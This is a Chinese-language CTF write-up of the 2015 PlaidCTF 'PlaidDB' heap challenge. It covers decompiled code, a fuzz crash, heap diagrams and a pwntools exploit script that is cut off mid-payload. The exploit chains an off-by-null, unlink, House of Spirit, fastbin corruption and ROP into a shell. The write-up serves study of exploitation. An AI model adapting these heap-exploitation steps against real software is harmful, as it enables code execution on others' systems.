---
title: 2015-PlaidCTF-PlaidDB
date: 2020-04-12 16:11:29
tags: [ctf, pwn, wp]
---

之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。

<!-- more -->

# Binary Analysis

程序保护全开：

```bash
➜  Plaid-CTF-2015-PlaidDB checksec ./datastore
[*] '/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（`"\n"`）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：

```bash
➜  Plaid-CTF-2015-PlaidDB ./datastore
INFO: Welcome to the PlaidDB data storage service.
INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
PROMPT: Enter command:
PUT
PROMPT: Enter row key:
AAA
PROMPT: Enter data size:
4
PROMPT: Enter data:
AAAA
INFO: Insert successful.
PROMPT: Enter command:
ERROR: '
' is not a valid command.
PROMPT: Enter command:
GET
PROMPT: Enter row key:
AAA
INFO: Row data [4 bytes]:
AAAAPROMPT: Enter command:
DUMP
INFO: Dumping all rows.
INFO: Row [AAA], 4 bytes
INFO: Row [th3fl4g], 8 bytes
PROMPT: Enter command:
DEL
PROMPT: Enter row key:
th3fl4g
INFO: Delete successful.
PROMPT: Enter command:
DUMP
INFO: Dumping all rows.
INFO: Row [AAA], 4 bytes
PROMPT: Enter command:
EXIT
INFO: Goodbye
```

先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：

```cpp
struct Node {
    char *key;
    long data_size;
    char *data;
    struct Node *left;
    struct Node *right;
    long dummy;
    long dummy1;
}
```

其中 get 函数一开始获取输入的列名（这里我已经标出了 `vulread()`，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：

```cpp
void get()
{
  char *key; // rbp
  struct Node *node; // rbx
  int cmp_result; // eax

  puts("PROMPT: Enter row key:");
  key = vulread();
  node = root;
LABEL_2:
  if ( node )
  {
    while ( 1 )
    {
      cmp_result = strcmp(key, node->key);
      if ( cmp_result < 0 )
      {
        node = node->left;
        goto LABEL_2;
      }
      if ( !cmp_result )
        break;
      node = node->right;
      if ( !node )
        goto LABEL_6;
    }
    __printf_chk(1LL, "INFO: Row data [%zd byte%s]:\n", node->data_size);
    fwrite(node->data, 1uLL, node->data_size, stdout);
    free(key);
  }
  else
  {
LABEL_6:
    puts("ERROR: Row not found.");
    free(key);
  }
}
```

在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：

```cpp
void put()
{
  void **chunk; // rbx
  unsigned __int64 size; // rax
  void *buf; // rax
  struct Node *v3; // rbp
  char size_1[24]; // [rsp+0h] [rbp-38h]
  unsigned __int64 canary; // [rsp+18h] [rbp-20h]

  canary = __readfsqword(0x28u);
  chunk = (void **)malloc(0x38uLL);
  if ( !chunk )
    goto LABEL_10;
  puts("PROMPT: Enter row key:");
  *chunk = vulread();
  puts("PROMPT: Enter data size:");
  saferead(size_1, 16LL);
  size = strtoul(size_1, 0LL, 0);
  chunk[1] = (void *)size;
  buf = malloc(size);
  chunk[2] = buf;
  if ( !buf )
  {
    puts("ERROR: Can't store that much data.");
    free(*chunk);
    if ( __readfsqword(0x28u) == canary )
    {
      free(chunk);
      return;
    }
LABEL_10:
    puts("FATAL: Can't allocate a row");
    exit(-1);
  }
  puts("PROMPT: Enter data:");
  readn(chunk[2], (size_t)chunk[1]);
  v3 = (struct Node *)insert_node(chunk);
  if ( v3 )
  {
    free(*chunk);
    free(v3->data);
    v3->data_size = (__int64)chunk[1];
    v3->data = (char *)chunk[2];
    free(chunk);
    puts("INFO: Update successful.");
  }
  else
  {
    puts("INFO: Insert successful.");
  }
  if ( __readfsqword(0x28u) != canary )
    goto LABEL_10;
}
```

dump 函数后序遍历红黑树并输出列名和数据长度：

```cpp
struct Node *dump()
{
  struct Node *result; // rax
  struct Node *node; // rbx
  struct Node *n; // rax

  puts("INFO: Dumping all rows.");
  result = (struct Node *)&root;
  node = root;
  if ( !root )
    return result;
  while ( node->left )
    node = node->left;
  while ( 1 )
  {
    while ( 1 )
    {
      node->data_size;
      __printf_chk(1LL, "INFO: Row [%s], %zd byte%s\n", node->key);
      n = node->right;
      if ( !n )
        break;
      do
      {
        node = n;
        n = n->left;
      }
      while ( n );
    }
    result = node->dummy;
    if ( !result || node != result->left )
      break;
LABEL_15:
    node = result;
  }
  while ( result )
  {
    if ( node != result->right )
      goto LABEL_15;
    node = result;
    result = result->dummy;
  }
  return result;
}
```

最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：

```cpp
int del()
{
  puts("PROMPT: Enter row key:");
  key = vulread();
  node = root;
LABEL_2:
  if ( !node )
  {
LABEL_6:
    puts("ERROR: Row not found.");
    return;
  }
  while ( 1 )
  {
    key_1 = node->key;
  ...
LABEL_69:
  LODWORD(n->dummy1) = 0;
LABEL_29:
  free(key_1);
  free(node->data);
  free(node);
  free(key);
  return puts("INFO: Delete successful.");
}
```

最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 `"\x00"`：

```cpp
char *vulread()
{
  char *buf; // r12
  char *end; // rbx
  size_t cap; // r14
  char c; // al
  char c_1; // bp
  signed __int64 idx; // r13
  char *new_buf; // rax

  buf = (char *)malloc(8uLL);
  end = buf;
  cap = malloc_usable_size(buf);                // 24
  while ( 1 )
  {
    c = _IO_getc(stdin);
    c_1 = c;
    if ( c == -1 )
      goodbye();
    if ( c == '\n' )
      break;
    idx = end - buf;
    if ( cap <= end - buf )
    {
      new_buf = (char *)realloc(buf, 2 * cap);
      buf = new_buf;
      if ( !new_buf )
      {
        puts("FATAL: Out of memory");
        exit(-1);
      }
      end = &new_buf[idx];
      cap = malloc_usable_size(new_buf);        // 48
    }
    *end++ = c_1;
  }
  *end = 0;                                   // off by one
  return buf;
}
```

再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：

```bash
➜  Plaid-CTF-2015-PlaidDB ltrace -e 'malloc+free+realloc+' ./datastore
datastore->malloc(56)                                                   = 0x564b295ad010
datastore->malloc(8)                                                    = 0x564b295ad050
datastore->malloc(9)                                                    = 0x564b295ad070
INFO: Welcome to the PlaidDB data storage service.
INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
PROMPT: Enter command:
PUT
datastore->malloc(56)                                                   = 0x564b295ad090
PROMPT: Enter row key:
datastore->malloc(8)                                                    = 0x564b295ad0d0
A
PROMPT: Enter data size:
0
datastore->malloc(0)                                                    = 0x564b295ad0f0
PROMPT: Enter data:
INFO: Insert successful.
PROMPT: Enter command:
DEL
PROMPT: Enter row key:
datastore->malloc(8)                                                    = 0x564b295ad110
A
datastore->free(0x564b295ad0d0)                                         = <void>
datastore->free(0x564b295ad0f0)                                         = <void>
datastore->free(0x564b295ad090)                                         = <void>
datastore->free(0x564b295ad110)                                         = <void>
INFO: Delete successful.
PROMPT: Enter command:
DUMP
INFO: Dumping all rows.
INFO: Row [th3fl4g], 8 bytes
PROMPT: Enter command:
EXIT
INFO: Goodbye
+++ exited (status 0) +++
```

# Vulnerability Analysis

根据上面的分析，有用的信息大概如下几个：

1. 每个节点固定大小（`malloc(56)`）；
2. `vulread()` 函数中有 `malloc()` 和 `realloc()`，可以用 `realloc()` 获取特定大小的 chunk；
3. `vulread()` 里存在 Off by Null；
4. 删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；
5. 往节点中读入数据时的大小可控（`malloc(size)`）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：

```bash
➜  Plaid-CTF-2015-PlaidDB ltrace -e 'malloc+free+realloc+' ./datastore
datastore->malloc(56)                                                   = 0x55feff2f2010
datastore->malloc(8)                                                    = 0x55feff2f2050
datastore->malloc(9)                                                    = 0x55feff2f2070
INFO: Welcome to the PlaidDB data storage service.
INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
PROMPT: Enter command:
PUT
datastore->malloc(56)                                                   = 0x55feff2f2090
PROMPT: Enter row key:
datastore->malloc(8)                                                    = 0x55feff2f20d0
A
PROMPT: Enter data size:
2
datastore->malloc(2)                                                    = 0x55feff2f20f0
PROMPT: Enter data:
A
INFO: Insert successful.
PROMPT: Enter command:
PUT
datastore->malloc(56)                                                   = 0x55feff2f2110
PROMPT: Enter row key:
datastore->malloc(8)                                                    = 0x55feff2f2150
A
PROMPT: Enter data size:
2
datastore->malloc(2)                                                    = 0x55feff2f2170
PROMPT: Enter data:
B
datastore->free(0x55feff2f2150)                                         = <void>
datastore->free(0x55feff2f20f0)                                         = <void>
datastore->free(0x55feff2f2110)                                         = <void>
INFO: Update successful.
PROMPT: Enter command:
EXIT
INFO: Goodbye
+++ exited (status 0) +++
```

看过一遍后，漏洞点其实就在 `vulread()` 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 `"\x00"`，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：

```
PUT
A
0
DEL
A
PUT
NNNNNN
0
PUT
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

可以看到在 free 的时候提示了 `"free(): invalid next size (fast)"`，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：

```
➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastore
INFO: Welcome to the PlaidDB data storage service.
INFO: Valid commands are GET, PUT, DUMP, DEL, EXIT
PROMPT: Enter command:
PROMPT: Enter row key:
PROMPT: Enter data size:
PROMPT: Enter data:
INFO: Insert successful.
PROMPT: Enter command:
PROMPT: Enter row key:
INFO: Delete successful.
PROMPT: Enter command:
PROMPT: Enter row key:
PROMPT: Enter data size:
GET
PROMPT: Enter data:
INFO: Insert successful.
PROMPT: Enter command:
GET
PROMPT: Enter row key:
AAAAAAAAAAAAAAAAAAAAAAAA
ERROR: Row not found.
cat: -: Resource temporarily unavailable
*** Error in `./datastore': free(): invalid next size (fast): 0x00005555557580d0 ***
```

这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 **size 变小**（shrink），同时也把 **prev_inuse 置为 0**；同时可以**设置下一个 chunk 的 prev_size**，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：

```
                                    prev                            prev
             size                   size     size                   size     size
 +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+
 |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   |
 +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+
   prev
   size     size
 +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+
 |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    |
 +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+
```

实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。

# Exploitation

下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：

```python
# Off by Null + Unlink
PUT('3', '')
PUT('0', 'C' * 0x80) # smallbin for unlink
PUT('1', '') # chunk for overflow
PUT('2', '')
PUT('1', 'A' * 0xf8)
```

结果大概如下，列 `'1'` 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：

```
 +------------+ 0x0f0 - 0x10
 |    0x40    | node '3'
 +------------+ 0x130 - 0x10
 |    0x20    | '3'
 +------------+ 0x150 - 0x10
 |    0x20    | ''
 +------------+ 0x170 - 0x10
 |    0x40    | node '0'
 +------------+ 0x1b0 - 0x10
 |    0x20    | '0'
 +------------+ 0x1d0 - 0x10
 |    0x90    | 'C' * 0x80
 +------------+ 0x260 - 0x10
 |    0x40    | node '1'
 +------------+ 0x2a0 - 0x10
 |    0x20    | '1'
 +------------+ 0x2c0 - 0x10
 |    0x20    | '' => [freed]
 +------------+ 0x2e0 - 0x10
 |    0x40    | node '2'
 +------------+ 0x320 - 0x10
 |    0x20    | '2'
 +------------+ 0x340 - 0x10
 |    0x20    | ''
 +------------+ 0x360 - 0x10
 |    0x40    | node '1' => [freed]
 +------------+ 0x3a0 - 0x10
 |    0x20    | '1' => [freed]
 +------------+ 0x3c0 - 0x10
 |   0x100    | 'A' * 0xf8
 +------------+
```

接下来 PUT 列 `'2'` 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：

```python
PUT('2', 'B' * 0xf8 + p64(0x21) + 'C' * 0x18) # chunk for off-by-null ; fake a fastbin
```

堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：

```
 +------------+ 0x0f0 - 0x10
 |    0x40    | node '3'
 +------------+ 0x130 - 0x10
 |    0x20    | '3'
 +------------+ 0x150 - 0x10
 |    0x20    | ''
 +------------+ 0x170 - 0x10
 |    0x40    | node '0'
 +------------+ 0x1b0 - 0x10
 |    0x20    | '0'
 +------------+ 0x1d0 - 0x10
 |    0x90    | 'C' * 0x80
 +------------+ 0x260 - 0x10
 |    0x40    | node '1'
 +------------+ 0x2a0 - 0x10
 |    0x20    | '1'
 +------------+ 0x2c0 - 0x10
 |    0x20    | '2' -> [freed]
 +------------+ 0x2e0 - 0x10
 |    0x40    | node '2'
 +------------+ 0x320 - 0x10
 |    0x20    | '2'
 +------------+ 0x340 - 0x10
 |    0x20    | '' => [freed]
 +------------+ 0x360 - 0x10
 |    0x40    | node '2' => [freed]
 +------------+ 0x3a0 - 0x10
 |    0x20    | [freed]
 +------------+ 0x3c0 - 0x10
 |   0x100    | 'A' * 0xf8
 +------------+ 0x4c0 - 0x10
 |   0x120    | 'B' * 0xf8 + p64(0x21) + 'C' * 0x18
 +------------+
```

然后接下来触发 Off-by-Null，并且：

```python
DEL('1')
DEL('X' * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752
DEL('0')
DEL('2') # unlink
```

smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：

```
 +------------+ 0x0f0 - 0x10                                    +------------+
 |    0x40    | node '3'                                        |    0x40    |
 +------------+ 0x130 - 0x10                                    +------------+
 |    0x20    | '3'                                             |    0x20    |
 +------------+ 0x150 - 0x10                                    +------------+
 |    0x20    | ''                                              |    0x20    |
 +------------+ 0x170 - 0x10                                    +------------+
 |    0x40    | node '0' => [freed]                             |    0x40    |
 +------------+ 0x1b0 - 0x10                                    +------------+
 |    0x20    | '0' => [freed]                                  |    0x20    |
 +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+
 |    0x90    | 'C' * 0x80 => [freed]                           |   0x3f0    |
 +------------+ 0x260 - 0x10                                    +---- :: ----+
 |    0x40    | node '1' => [freed]                             |     ::     |
 +------------+ 0x2a0 - 0x10                                    +---- :: ----+
 |    0x20    | '1' => [freed]                                  |     ::     |
 +------------+ 0x2c0 - 0x10                                    +---- :: ----+
 |    0x20    | [freed]                                         |     ::     |
 +------------+ 0x2e0 - 0x10                                    +---- :: ----+
 |    0x40    | node '2' => [freed]                             |     ::     |
 +------------+ 0x320 - 0x10                                    +---- :: ----+
 |    0x20    | '2' => [freed]                                  |     ::     |
 +------------+ 0x340 - 0x10                                    +---- :: ----+
 |    0x20    | [freed]                                         |     ::     |
 +------------+ 0x360 - 0x10                                    +---- :: ----+
 |    0x40    | [freed]                                         |     ::     |
 +------------+ 0x3a0 - 0x10                                    +---- :: ----+
 |    0x20    | [freed]                                         |     ::     |
 +------------+ 0x3c0 - 0x10                       0x3c0 - 0x10 +---- :: ----+
 |   0x100    | 'X' * 0xf8                           'X' * 0xf8 |     ::     |
 +------------+ 0x4c0 - 0x10                                    +---- :: ----+
 |   0x120    | 'B' * 0xf8 + p64(0x21) + 'C' * 0x18 => [freed]  |     ::     |
 +------------+                                    0x5c0 - 0x10 +------------+
                                                     'C' * 0x18 |    0x20    |
                                                                +------------+
```

利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：

```python
# Leak Heap Address
DEL('3') # put a previous node chunk into fastbin
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(0) + 'D' * 0x30 +
	p64(0x21) + p64(0) + 'C' * 0x10 +
	p64(0x21) + 'KEY1\x00').ljust(1000, 'Q')
)
PUT('LEAKBUF', '')
data = GET('KEY1')
heap_base = u64(data[0x110:0x118]) - 0x150
info('heap_base = ' + hex(heap_base))

# Function for Leaking Memory
def leak(addr, size):
	PUT('KEY1', 'A' * 0x3e8)
	PUT('KEY1', data[:0x118] + p64(size) + p64(addr) + data[0x128:])
	return GET('LEAKBUF')
```

LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：

```
 +------------+ 0x0f0 - 0x10
 |    0x40    | node '3' => [freed] => node 'KEY1'
 +------------+ 0x130 - 0x10
 |    0x20    | '3' => [freed] => ''
 +------------+ 0x150 - 0x10
 |    0x20    | '' => [freed] => 'LEAKBUF'
 +------------+ 0x170 - 0x10
 |    0x40    | [freed]
 +------------+ 0x1b0 - 0x10
 |    0x20    | [freed]
 +------------+ 0x1d0 - 0x10
 |   0x3f0    | [freed] => chunk
 +---- :: ----+ 0x260 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2a0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2c0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2e0 - 0x10
 |   [0x40]   | [freed] => node 'LEAKBUF'
 +---- :: ----+ 0x320 - 0x10
 |   [0x20]   | [freed]
 +---- :: ----+ 0x340 - 0x10
 |   [0x20]   | [freed] => 'KEY1'
 +---- :: ----+ 0x360 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x3a0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x3c0 - 0x10
 |     ::     | 'X' * 0xf8
 +---- :: ----+ 0x4c0 - 0x10
 |     ::     | [freed]
 +------------+ 0x5c0 - 0x10
 |    0x20    | 'C' * 0x18
 +------------+
```

接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：

```python
# House of Spirit + Fastbin Corruption + ROP
PUT('KEY1', 'A' * 0x3e8)
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF's key to 'P\x00'
	p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
	p64(0x40) + p64(0x40) + 'KEY1\x00'.ljust(0x38, 'A') + # 0x358
	p64(0x40) + 'A' * 0x78 + # 0x3d8
	p64(0x40) + 'P\x00'.ljust(0x38, 'A') + p64(0x41)).ljust(0x3e8, 'Q')
)
DEL('P') # house of spirit
DEL('KEY1')
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(heap_base + 0x3e0) +
	p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
	p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + 'A' * 0x30 +
	p64(0x40) + 'A' * 0x78 + # 0x3d8
	p64(0x40) + 'A' * 0x40 + # 0x420
	p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, 'Q') # place gadgets
) # fastbin corruption
```

最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：

```
 +------------+ 0x0f0 - 0x10
 |    0x40    | node 'KEY1'
 +------------+ 0x130 - 0x10
 |    0x20    | ''
 +------------+ 0x150 - 0x10
 |    0x20    | 'LEAKBUF'
 +------------+ 0x170 - 0x10
 |    0x40    | [freed]
 +------------+ 0x1b0 - 0x10
 |    0x20    | [freed]
 +------------+ 0x1d0 - 0x10
 |   0x3f0    | chunk
 +---- :: ----+ 0x260 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2a0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2c0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x2e0 - 0x10
 |   [0x40]   | node 'LEAKBUF'
 +---- :: ----+ 0x320 - 0x10
 |   [0x20]   | [freed]
 +---- :: ----+ 0x340 - 0x10
 |   [0x20]   | 'KEY1' => fake_chunk_addr
 +---- :: ----+ 0x360 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x3a0 - 0x10
 |     ::     | [freed]
 +---- :: ----+ 0x3c0 - 0x10
 |   [0x40]   | 'X' * 0xf8 => 'P\x00' => 'A' * 0x40 + gadgets
 +---- :: ----+ 0x4c0 - 0x10
 |     ::     | [freed]
 +------------+ 0x5c0 - 0x10
 |    0x20    | 'C' * 0x18
 +------------+
```

最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：

```python
cmd('PUT')
p.recvuntil('Enter row key:')
p.sendline('KEY1')
p.recvuntil('Enter data size:')
p.send('56'.ljust(8, ' ') + p64(0x42))
p.recvuntil('PROMPT: Enter data:')
p.send(('A' * 7 + p64(canary) + 'A' * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, 'A'))
```

最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 `"\x00"`：

```
0x7fff7e985540: 0x2020202020203635      0x0000000000000042
0x7fff7e985550: 0x4141414141414100      0xa5f15260d1090900
0x7fff7e985560: 0x4141414141414141      0x4141414141414141
0x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e
0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900
```

在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：

```
datastore->malloc(56)             = 0x55ac13f22010
datastore->malloc(8)              = 0x55ac13f22050
datastore->malloc(9)              = 0x55ac13f22070
datastore->malloc(56)             = 0x55ac13f22090 => 'X' * 0x200
datastore->malloc(8)              = 0x55ac13f220d0
datastore->malloc(56)             = 0x55ac13f220f0
datastore->malloc(56)             = 0x55ac13f22130
datastore->malloc(8)              = 0x55ac13f22170
datastore->malloc(56)             = 0x55ac13f22190
datastore->malloc(56)             = 0x55ac13f221d0
datastore->malloc(8)              = 0x55ac13f22210
datastore->malloc(56)             = 0x55ac13f22230
datastore->malloc(56)             = 0x55ac13f22270
datastore->malloc(8)              = 0x55ac13f222b0
datastore->malloc(56)             = 0x55ac13f222d0
datastore->malloc(56)             = 0x55ac13f22310
datastore->malloc(8)              = 0x55ac13f22350
datastore->malloc(56)             = 0x55ac13f22370
datastore->malloc(56)             = 0x55ac13f223b0
datastore->malloc(8)              = 0x55ac13f223f0 => '6'
datastore->malloc(56)             = 0x55ac13f22410
datastore->malloc(56)             = 0x55ac13f22450
datastore->malloc(8)              = 0x55ac13f22490 => '4' => [freed] => 'fillup2'
datastore->malloc(56)             = 0x55ac13f224b0 => [freed] => node 'fillup2'
datastore->malloc(56)             = 0x55ac13f224f0 => node '4' => [freed] => node 'fillup1'
datastore->malloc(8)              = 0x55ac13f22530 => '3' => [freed]
datastore->malloc(56)             = 0x55ac13f22550 => node '6'
datastore->malloc(56)             = 0x55ac13f22590 => node '5' => [freed]
datastore->malloc(8)              = 0x55ac13f225d0 => '5' => [freed]
datastore->malloc(56)             = 0x55ac13f225f0 => node '3' => [freed]
datastore->malloc(56)             = 0x55ac13f22630 => node '1' => [freed]
datastore->malloc(8)              = 0x55ac13f22670 => '2'
datastore->malloc(56)             = 0x55ac13f22690 => node '2'
datastore->malloc(8)              = 0x55ac13f226d0 => '1' => [freed] => 'fillup1'
datastore->malloc(512)            = 0x55ac13f226f0 => '1' * 0x200 => [freed] <= unlink pointer => 'X' * 0x200
datastore->malloc(80)             = 0x55ac13f22900 => '2' * 0x50
datastore->malloc(104)            = 0x55ac13f22960 => '5' * 0x68 => [freed] <= overlap fd
datastore->malloc(504)            = 0x55ac13f229d0 => '3' * 0x1f8 => [freed] => 'A' * 0x1f0 + p64(0xdb0 - 0x6f0)
datastore->malloc(240)            = 0x55ac13f22bd0 => '4' * 0xf0 => [freed]
datastore->malloc(1024)           = 0x55ac13f22cd0 => '6' * 0x400
```

# Exploit Script

第一种方法的 Exploit 主要是跟着 Winesap 做的：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

local = 0
if local:
	p = process('./datastore')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('127.0.0.1', 4000)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
	p.recvuntil('Enter command:')
	p.sendline(c)

def PUT(key, data):
	cmd('PUT')
	p.recvuntil('Enter row key:')
	p.sendline(key)
	p.recvuntil('Enter data size:')
	p.sendline(str(len(data)))
	p.recvuntil('PROMPT: Enter data:')
	p.send(data)

def DEL(key):
	cmd('DEL')
	p.recvuntil('Enter row key:')
	p.sendline(key)

def GET(key):
	cmd('GET')
	p.recvuntil('Enter row key:')
	p.sendline(key)
	p.recvuntil(' bytes]:\n')
	return p.recvuntil('PROMPT: ')[:-8]

PUT('MMAP', 'Z' * 0x21000)
# Off by Null + Unlink
PUT('3', '')
PUT('0', 'C' * 0x80) # smallbin for unlink
PUT('1', '') # chunk for overflow
PUT('2', '')
PUT('1', 'A' * 0xf8)
PUT('2', 'B' * 0xf8 + p64(0x21) + 'C' * 0x18) # chunk for off-by-null ; fake a fastbin
DEL('1')
DEL('X' * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size
DEL('0')
DEL('2') # unlink
#raw_input('@')

# Leak Heap Address
DEL('3') # put a previous node chunk into fastbin
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(0) + 'D' * 0x30 +
	p64(0x21) + p64(0) + 'C' * 0x10 +
	p64(0x21) + 'KEY1\x00').ljust(1000, 'Q')
)
PUT('LEAKBUF', '')
data = GET('KEY1')
heap_base = u64(data[0x110:0x118]) - 0x150
info('heap_base = ' + hex(heap_base))
#raw_input('@')

# Function for Leaking Memory
def leak(addr, size):
	PUT('KEY1', 'A' * 0x3e8)
	PUT('KEY1', data[:0x118] + p64(size) + p64(addr) + data[0x128:])
	return GET('LEAKBUF')

mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10
info('mmap_chunk = ' + hex(mmap_chunk))
libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740
info('libc_base = ' + hex(libc_base))
canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))
info('canary = ' + hex(canary))
stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))
info('stack_addr = ' + hex(stack_addr))
#raw_input('@')

# find Gadgets & Buffer
pop_rdi_ret = libc_base + libc.search(asm('pop rdi ; ret')).next()
leave_ret = libc_base + libc.search(asm('leave ; ret')).next()
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()
info('pop_rdi_ret = ' + hex(pop_rdi_ret))
info('leave_ret = ' + hex(leave_ret))
info('system_addr = ' + hex(system_addr))
info('bin_sh_addr = ' + hex(bin_sh_addr))
fake_chunk_addr = stack_addr - 0x90
fake_rbp = heap_base + 0x420 - 8
#raw_input('@')

# House of Spirit + Fastbin Corruption + ROP
PUT('KEY1', 'A' * 0x3e8)
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF's key to 'P\x00'
	p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
	p64(0x40) + p64(0x40) + 'KEY1\x00'.ljust(0x38, 'A') + # 0x358
	p64(0x40) + 'A' * 0x78 + # 0x3d8
	p64(0x40) + 'P\x00'.ljust(0x38, 'A') + p64(0x41)).ljust(0x3e8, 'Q')
)
DEL('P') # house of spirit
DEL('KEY1')
#raw_input('@')
PUT('KEY1', ('A' * 0x108 +
	p64(0x40) + p64(heap_base + 0x3e0) +
	p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
	p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + 'A' * 0x30 +
	p64(0x40) + 'A' * 0x78 + # 0x3d8
	p64(0x40) + 'A' * 0x40 + # 0x420
